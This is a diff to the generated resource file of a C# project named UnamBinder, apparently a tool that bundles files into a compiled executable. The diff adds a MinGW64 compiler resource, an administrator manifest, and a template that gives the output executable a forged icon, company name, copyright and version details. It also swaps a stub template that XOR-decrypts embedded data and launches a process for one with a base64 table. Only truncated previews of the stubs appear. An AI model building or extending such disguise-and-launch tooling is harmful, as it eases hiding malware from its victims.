+++ UnamBinder/Properties/Resources.Designer.cs
@@ -63,9 +63,9 @@ namespace UnamBinder.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
-        internal static byte[] manifest {
+        internal static byte[] administrator {
             get {
-                object obj = ResourceManager.GetObject("manifest", resourceCulture);
+                object obj = ResourceManager.GetObject("administrator", resourceCulture);
                 return ((byte[])(obj));
             }
         }
@@ -81,32 +81,59 @@ namespace UnamBinder.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to #include &lt;windows.h&gt;
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        internal static byte[] MinGW64 {
+            get {
+                object obj = ResourceManager.GetObject("MinGW64", resourceCulture);
+                return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to #include &lt;direct.h&gt;
+        ///#include &lt;stdio.h&gt;
         ///#include &lt;stdlib.h&gt;
+        ///#include &lt;windows.h&gt;
         ///
         ////* Created by Unam Sanctam, https://github.com/UnamSanctam */
         ///
-        ///char* cipher(char* data, char* key, int dataLen) {
-        ///	int keyLen = strlen(key);
-        ///	char* output = (char*)malloc(sizeof(char) * dataLen+1);
-        ///	output[dataLen] = 0;
-        ///	for (int i = 0; i &lt; dataLen; ++i) {
-        ///		output[i] = data[i] ^ key[i % keyLen];
-        ///	}
-        ///	return output;
-        ///}
-        ///
-        ///int main(int argc, char **argv) 
-        ///{
-        ///	PROCESS_INFORMATION p_info;
-        ///	STARTUPINFO s_info;
-        ///
-        ///	memset(&amp;s_info, 0, sizeof(s_info));
-        ///	memset(&amp;p_info, 0, sizeof( [rest of string was truncated]&quot;;.
+        ///char base46_map[] = {&apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;, &apos;G&apos;, &apos;H&apos;, &apos;I&apos;, &apos;J&apos;, &apos;K&apos;, &apos;L&apos;, &apos;M&apos;, &apos;N&apos;, &apos;O&apos;, &apos;P&apos;,
+        ///                     &apos;Q&apos;, &apos;R&apos;, &apos;S&apos;, &apos;T&apos;, &apos;U&apos;, &apos;V&apos;, &apos;W&apos;, &apos;X&apos;, &apos;Y&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos;e&apos;, &apos;f&apos;,
+        ///                     &apos;g&apos;, &apos;h&apos;, &apos;i&apos;, &apos;j&apos;, &apos;k&apos;, &apos;l&apos;, &apos;m&apos;, &apos;n&apos;, &apos;o&apos;, &apos;p&apos;, &apos;q&apos;, &apos;r&apos;, &apos;s&apos;, &apos;t&apos;, &apos;u&apos;, &apos;v&apos;,
+        ///                     &apos;w&apos;, &apos;x&apos;, &apos;y&apos;, &apo....
         /// </summary>
         internal static string Program1 {
             get {
                 return ResourceManager.GetString("Program1", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to #ifdef DefIcon
+        ///MAINICON ICON &quot;#ICON&quot;
+        ///#endif
+        ///#ifdef DefAdmin
+        ///1 24 &quot;administrator.manifest&quot;
+        ///#endif
+        ///#ifdef DefAssembly
+        ///VS_VERSION_INFO VERSIONINFO
+        ///BEGIN
+        ///    BLOCK &quot;StringFileInfo&quot;
+        ///    BEGIN
+        ///        BLOCK &quot;040904b0&quot;
+        ///        BEGIN
+        ///            VALUE &quot;CompanyName&quot;, &quot;#COMPANY&quot;
+        ///			VALUE &quot;FileTITLE&quot;, &quot;#TITLE&quot;
+        ///            VALUE &quot;FileDescription&quot;, &quot;#DESCRIPTION&quot;
+        ///            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
+        ///            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
+        ///			VALUE &quot;LegalTrademark&quot;, &quot;#TRADEMARK&quot;
+        ///        [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string resource {
+            get {
+                return ResourceManager.GetString("resource", resourceCulture);
             }
         }